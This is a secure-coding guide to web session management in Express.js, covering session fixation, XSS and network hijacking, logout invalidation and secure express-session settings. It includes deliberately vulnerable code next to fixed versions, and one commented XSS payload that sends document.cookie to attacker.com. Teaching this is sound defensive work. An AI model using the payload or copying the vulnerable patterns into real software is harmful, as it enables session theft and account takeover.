# Session Management Security

## Definition

Session management is the process of securely establishing, maintaining, and terminating user sessions in a web application. A session represents an authenticated connection between a client and server, typically identified by a unique session ID stored in a cookie or token. Proper session management is critical because improper implementation can allow attackers to hijack legitimate user sessions, performing actions on behalf of the user without authorization.

## Session ID Generation and Entropy Requirements

A session ID must be cryptographically secure and unpredictable. The requirements are:

- **Length**: Minimum 128 bits (16 bytes) for session IDs in modern applications; 256 bits (32 bytes) is recommended
- **Entropy**: Generated using a cryptographically secure random number generator
- **Uniqueness**: Each ID must be globally unique across all sessions
- **Unpredictability**: It should be impossible to predict or guess future or past session IDs
- **No Reuse**: Once a session ID is invalidated, it must never be reused

The entropy requirement exists because if session IDs are predictable, an attacker can guess valid session IDs and impersonate users. For example, sequential IDs (1, 2, 3...) are trivial to brute force.

## Session Fixation Attack

### How It Works

A session fixation attack occurs when an attacker tricks a user into using a session ID that the attacker has pre-chosen. The attack proceeds as follows:

1. **Attacker creates a session**: The attacker visits the target application and obtains a valid session ID (e.g., `sessionid=ABC123`)
2. **Attacker tricks user**: The attacker sends the user a link containing this session ID: `https://targetapp.com/?sessionid=ABC123`
3. **User logs in**: The user clicks the link and logs into their account while using the attacker-controlled session ID
4. **Attacker hijacks session**: Because the session ID hasn't changed, the attacker can now use `sessionid=ABC123` to access the user's authenticated session

### Step-by-Step Attack Process

```
1. Attacker → GET /login?sessionid=PRESET123 → Application
2. Application creates unauthenticated session with ID=PRESET123
3. Attacker sends victim link: /login?sessionid=PRESET123
4. Victim → GET /login?sessionid=PRESET123 → Application
5. Victim logs in with username/password
6. Application keeps same session ID (PRESET123) for authenticated session
7. Attacker → GET /api/profile using PRESET123 cookie → Application
8. Application returns victim's profile data (attacker is now authenticated as victim)
```

### Vulnerable Code Example

```javascript
const express = require('express');
const session = require('express-session');
const app = express();

// VULNERABLE: Session ID can be passed as query parameter
app.use(session({
  secret: 'my-secret',
  resave: false,
  saveUninitialized: true,
  cookie: {
    maxAge: 1000 * 60 * 60 * 24 // 24 hours
    // PROBLEM: httpOnly, secure, and sameSite not set
  }
}));

app.get('/login', (req, res) => {
  // VULNERABLE: Accepting session ID from URL
  if (req.query.sessionid) {
    req.session.id = req.query.sessionid; // Attacker can preset the session ID
  }
  res.send('Login page');
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  // Validate credentials...
  if (validCredentials) {
    // VULNERABLE: Not regenerating session ID after login
    req.session.userId = user.id;
    req.session.username = username;
    res.redirect('/dashboard');
  }
});

app.get('/dashboard', (req, res) => {
  if (!req.session.userId) {
    return res.redirect('/login');
  }
  res.send(`Welcome ${req.session.username}`);
});
```

### Secure Code Example

```javascript
const express = require('express');
const session = require('express-session');
const crypto = require('crypto');
const app = express();

// SECURE: Proper session configuration
app.use(session({
  secret: process.env.SESSION_SECRET, // Use strong secret from environment
  resave: false,
  saveUninitialized: false, // Don't create session until login
  genid: (req) => {
    // Custom secure session ID generation using crypto
    return crypto.randomBytes(32).toString('hex');
  },
  cookie: {
    httpOnly: true,      // Prevent JavaScript access
    secure: true,        // HTTPS only
    sameSite: 'strict',  // Prevent CSRF
    maxAge: 1000 * 60 * 60 * 24, // 24 hours
    domain: 'app.example.com'
  }
}));

app.post('/login', (req, res) => {
  const { username, password } = req.body;

  // Validate credentials...
  if (validCredentials) {
    // SECURE: Regenerate session ID after successful login
    req.session.regenerate((err) => {
      if (err) {
        return res.status(500).send('Login failed');
      }

      // Only now assign user data
      req.session.userId = user.id;
      req.session.username = username;
      req.session.loginTime = Date.now();

      res.redirect('/dashboard');
    });
  }
});

app.post('/logout', (req, res) => {
  // SECURE: Properly invalidate session
  req.session.destroy((err) => {
    if (err) {
      return res.status(500).send('Logout failed');
    }
    res.redirect('/login');
  });
});

app.get('/dashboard', (req, res) => {
  // Session middleware ensures this runs only for valid sessions
  if (!req.session.userId) {
    return res.redirect('/login');
  }
  res.send(`Welcome ${req.session.username}`);
});
```

## Session Hijacking via XSS or Network Sniffing

### XSS-Based Session Hijacking

If an application is vulnerable to Cross-Site Scripting (XSS), an attacker can inject JavaScript that steals the session cookie:

```javascript
// VULNERABLE: XSS allows this to run on the page
// Attacker injects: <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
// Without httpOnly flag, the session cookie is accessible
```

### Network Sniffing

Without HTTPS, session cookies are transmitted in plaintext over the network. An attacker on the same network can intercept the cookie:

```
1. Victim connects to public WiFi
2. Attacker intercepts HTTP traffic (packet capture with Wireshark)
3. Attacker extracts session cookie from Set-Cookie header
4. Attacker uses the stolen cookie to access victim's account
```

## Missing Session Invalidation on Logout

When a user logs out, the server must completely invalidate the session:

### Vulnerable Logout

```javascript
// VULNERABLE: Session not destroyed
app.get('/logout', (req, res) => {
  req.session.userId = null; // Only clears the data
  res.redirect('/login');
  // PROBLEM: Session ID is still valid, attacker could reuse it
});
```

### Secure Logout

```javascript
// SECURE: Session is completely destroyed
app.post('/logout', (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      return res.status(500).send('Logout error');
    }
    // Clear the session cookie from client
    res.clearCookie('connect.sid');
    res.redirect('/login');
  });
});
```

## Concurrent Session Management

Concurrent sessions occur when one user has multiple active sessions (e.g., multiple browser tabs, different devices). Depending on the application, you may want to:

1. **Allow unlimited concurrent sessions**: User can be logged in on multiple devices simultaneously (typical for modern apps)
2. **Limit concurrent sessions per user**: Only allow N active sessions
3. **Single session per user**: Log out previous sessions when user logs in elsewhere

### Example: Limiting Concurrent Sessions

```javascript
const redis = require('redis');
const client = redis.createClient();

// Track active session IDs per user
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  if (validCredentials) {
    const userId = user.id;
    const maxConcurrentSessions = 3;

    // Get existing sessions for this user
    client.smembers(`user:${userId}:sessions`, (err, sessionIds) => {
      // If too many sessions, invalidate oldest
      if (sessionIds.length >= maxConcurrentSessions) {
        const oldestSessionId = sessionIds[0];
        // Invalidate oldest session
        deleteSession(oldestSessionId);
        client.srem(`user:${userId}:sessions`, oldestSessionId);
      }

      // Create new session
      req.session.regenerate((err) => {
        req.session.userId = userId;

        // Track this session for the user
        client.sadd(`user:${userId}:sessions`, req.sessionID);
        client.expire(`user:${userId}:sessions`, 24 * 60 * 60); // 24 hours

        res.redirect('/dashboard');
      });
    });
  }
});
```

## Secure Session Configuration: express-session Options

Proper configuration of `express-session` is critical. Here's the anatomy of each security-relevant option:

```javascript
app.use(session({
  // Session store (use production-grade store like connect-redis or connect-mongo)
  store: new RedisStore({
    client: redisClient,
    prefix: 'sess:',
    ttl: 86400 // 24 hours in seconds
  }),

  // Secret used to sign the session ID cookie
  // MUST be kept secret and rotated periodically
  secret: process.env.SESSION_SECRET,

  // Whether to save session if unmodified
  resave: false,

  // Whether to save uninitialized session
  saveUninitialized: false, // Don't create until user logs in

  // Session ID generation function
  genid: (req) => crypto.randomBytes(32).toString('hex'),

  cookie: {
    // HttpOnly prevents JavaScript from accessing the cookie
    // This blocks XSS attacks from stealing the session
    httpOnly: true,

    // Secure flag ensures cookie only sent over HTTPS
    // Prevents network eavesdropping and MitM attacks
    secure: true,

    // SameSite prevents CSRF attacks
    // 'strict': Cookie not sent for any cross-site requests
    // 'lax': Cookie sent for top-level navigation (safe for most cases)
    // 'none': Cookie sent for all cross-site requests (requires Secure flag)
    sameSite: 'lax',

    // Maximum age in milliseconds
    maxAge: 1000 * 60 * 60 * 24, // 24 hours

    // Domain restriction
    domain: 'app.example.com',

    // Path restriction
    path: '/',

    // Partitioned: For use with third-party cookies (Chrome 131+)
    // Isolates cookies by top-level site for privacy
    partitioned: false
  }
}));
```

## Regenerating Session ID on Login

Session ID regeneration is essential to prevent session fixation attacks. The process:

1. User logs in successfully
2. Server destroys the old session (or marks it as invalid)
3. Server creates a brand new session with a fresh, cryptographically random ID
4. Server assigns user data to the new session
5. User's browser receives the new session cookie

```javascript
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  // Validate credentials
  const user = await db.user.findOne({ username });
  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    return res.status(401).send('Invalid credentials');
  }

  // CRITICAL: Regenerate session ID to prevent session fixation
  req.session.regenerate((err) => {
    if (err) {
      return res.status(500).send('Login failed');
    }

    // Now assign user data to the fresh session
    req.session.userId = user.id;
    req.session.username = user.username;
    req.session.roles = user.roles;
    req.session.loginTime = Date.now();

    res.json({
      message: 'Login successful',
      redirect: '/dashboard'
    });
  });
});
```

## Best Practices

1. **Always use HTTPS**: Session cookies must travel only over encrypted connections
2. **Use cryptographically secure session ID generation**: Minimum 128 bits, preferably 256 bits of entropy
3. **Set httpOnly and Secure flags**: Prevent JavaScript access and ensure HTTPS-only transmission
4. **Use SameSite=Lax or SameSite=Strict**: Prevent CSRF attacks
5. **Regenerate session ID on login**: Prevent session fixation attacks
6. **Implement proper session invalidation on logout**: Completely destroy the session
7. **Use a server-side session store**: Never rely on client-side session data; use Redis, MongoDB, or similar
8. **Set appropriate session timeouts**: Balance security with user experience (30 minutes to 24 hours)
9. **Monitor for concurrent sessions**: Implement alerts if unusual concurrent sessions are detected
10. **Never accept session ID from user input**: Always generate on the server side
11. **Use secure session store transport**: If using Redis, require TLS connections
12. **Rotate session secrets periodically**: Especially if the old secret is compromised
13. **Implement session binding to IP/User-Agent**: Optional additional layer (note: may break mobile users)
14. **Log session creation and destruction**: For security auditing and forensics
15. **Test for session fixation vulnerabilities**: Use security testing tools and manual penetration testing
